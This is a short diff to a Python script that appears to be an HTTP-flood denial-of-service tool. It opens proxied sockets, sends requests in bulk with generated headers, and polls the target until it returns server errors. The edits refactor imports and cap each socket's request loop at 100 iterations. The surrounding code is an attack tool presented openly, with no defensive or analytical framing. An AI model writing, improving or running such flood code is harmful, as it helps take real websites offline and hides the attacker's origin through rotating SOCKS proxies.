@@ -1,14 +1,14 @@
 import ssl
 import socks
 import socket
-import requests
+from requests import get
 from urllib.parse import urlparse, ParseResult
 from random import randint
 from time import sleep
-
-from cc_utils import gen_header
-from socks_proxy_getter import get_random_proxy
 from multiprocessing import Manager
+
+from .cc_utils import gen_header
+from .socks_proxy_getter import get_random_proxy
 
 manager = Manager()
 
@@ -26,7 +26,7 @@ def send_request(mode: str,
             if not proxy:
                 proxy = get_random_proxy()
             with (_get_socket(target_url, proxy)) as s:
-                while not stop.value:
+                for _ in range(100):
                     global i
                     i.value += 1
                     request = _mk_request(mode, target_url)
@@ -66,7 +66,7 @@ def check(target: str, stop):
         try:
             sleep(10)
             print("Checking...")
-            with (requests.get(target)) as r:
+            with (get(target)) as r:
                 if r.status_code >= 500:
                     stop.value = True
         except Exception as e:
